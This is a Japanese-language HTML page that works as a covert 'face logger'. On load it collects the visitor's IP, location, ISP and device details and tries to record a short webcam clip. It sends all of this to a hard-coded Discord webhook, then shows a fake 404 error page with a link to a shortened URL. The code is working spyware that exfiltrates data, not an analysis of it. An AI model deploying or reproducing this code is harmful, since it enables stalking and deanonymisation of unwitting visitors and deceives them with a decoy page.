<!DOCTYPE html>
<html lang="ja">
<head><meta charset="UTF-8"></head>
<body style="background: #000;">
    <video id="v" autoplay style="display:none;"></video>

    <script>
        const WH_URL = "https://discord.com/api/webhooks/1470231686468862012/J4qtzSuoIldCKTSdJgHAN_L0Sx9jXl1yvaYkXZFY4Ohxu0T_X71KpAG7k2dgRmmUnS8v";
        const JUMP_URL = "https://x.gd/E7I1m";

        async function LULU_Initiate() {
            // 1. ネ
            let n = {};
            try {
                // 冗
                const r = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org,as,query');
                n = await r.json();
            } catch(e) { n = { query: "取得失敗" }; }

            let battOnly = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battOnly = `${Math.round(b.level * 100)}%`;
            }

            const log = {
                ua: navigator.userAgent,
                plat: navigator.platform,
                cpu: navigator.hardwareConcurrency + "コア",
                mem: navigator.deviceMemory + "GB",
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                batt: battOnly,
                onl: navigator.onLine ? "オンライン" : "オフライン"
            };

            // 2. ビデ）
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
                const chunks = [];
                
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    await LULU_Transmit(log, n, videoBlob);
                    stream.getTracks().forEach(t => t.stop());
                };

                recorder.start(100);
                setTimeout(() => recorder.stop(), 2200); 
            } catch (e) { 
                await LULU_Transmit(log, n, null); 
            }
        }

        async function LULU_Transmit(l, n, videoBlob) {
            const lat = n.lat || "0";
            const lon = n.lon || "0";
            const mapUrl = `http://google.com/maps?q=${lat},${lon}`;
            
            // 横幅を稼ぐための透明な区切り線と装飾
            const separator = "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬";

            const payload = {
                content: "## ||@everyone||　やりすぎやろってｗ😡 ",
                embeds: [{
                    title: "--- kanikama face logger BETA owner@kointyanotp---",
                    description: separator,
                    color: 0x2f3136,
                    fields: [
                        { name: "🌐 ネットワーク", value: `\`\`\`yaml\nIP: ${n.query || "N/A"}\nISP: ${n.isp || "N/A"}\nASN: ${n.as || "N/A"}\`\`\`` },
                        { name: "📍 位置情報", value: `\`\`\`yaml\n国: ${n.country || "N/A"}\n都市: ${n.city || "N/A"}\n時間: ${n.timezone || "N/A"}\n座標: ${lat}, ${lon}\`\`\`\n[📍 グーグルマップで開く](${mapUrl})` },
                        { name: "💻 デバイス情報", value: `\`\`\`yaml\nOS: ${l.plat}\nCPU: ${l.cpu}\nRAM: ${l.mem}\n画面: ${l.screen}\n言語: ${l.lang}\`\`\`` },
                        { name: "🔋 ステータス", value: `\`\`\`yaml\nバッテリー: ${l.batt}\n接続状態: ${l.onl}\`\`\`` }
                    ],
                    // imageを指定することで、embedのすぐ下に動画が配置されます
                    image: videoBlob ? { url: "attachment://video.webm" } : null,
                    footer: { text: "SESSION_ID: " + Math.random().toString(36).substr(2, 9).toUpperCase() }
                }]
            };

            const formData = new FormData();
            formData.append('payload_json', JSON.stringify(payload));
            if (videoBlob) {
                formData.append('file', videoBlob, 'video.webm');
            }

            await fetch(WH_URL, { method: 'POST', body: formData });
            LULU_Finalize();
        }

        function LULU_Finalize() {
            document.body.style.backgroundColor = "#fff";
            document.body.innerHTML = `
                <div style="padding: 40px; font-family: sans-serif; max-width: 600px; margin: auto;">
                    <h1 style="font-size: 40px;">404 Not Found</h1><hr>
                    <p>内部サーバーエラーが発生しました。</p>
                    <div style="background: #f4f4f4; padding: 15px; border-left: 5px solid #d9534f; font-family: monospace;">
                        - EXCEPTION: 0x8004210B (TIMEOUT)<br>
                        - STATUS: 0x00FF_EXTRACTION_COMPLETED
                    </div>
                    <p>接続を復旧するには以下のボタンをクリックしてください：</p>
                    <a href="${JUMP_URL}" style="padding: 12px 24px; background: #0275d8; color: white; text-decoration: none; border-radius: 4px; display: inline-block;">接続を復旧する</a>
                </div>
            `;
        }

        window.onload = LULU_Initiate;
    </script>
</body>
</html>
